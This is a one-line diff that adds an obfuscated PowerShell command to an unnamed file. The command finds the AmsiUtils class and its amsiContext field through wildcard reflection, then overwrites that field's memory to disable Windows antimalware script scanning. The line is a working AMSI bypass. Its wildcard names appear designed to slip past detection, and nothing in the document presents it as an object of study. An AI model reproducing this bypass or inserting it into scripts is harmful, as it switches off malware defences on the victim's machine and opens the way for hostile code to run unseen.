@@ -1,1 +1,2 @@
+$a=[Ref].Assembly.GetTypes()|?{$_.Name-like'*siUtils'};$b=$a.GetFields('NonPublic,Static')|?{$_.Name-like'*siContext'};[IntPtr]$c=$b.GetValue($null);[Int32[]]$d=@(0xff);[System.Runtime.InteropServices.Marshal]::Copy($d,0,$c,1)
 
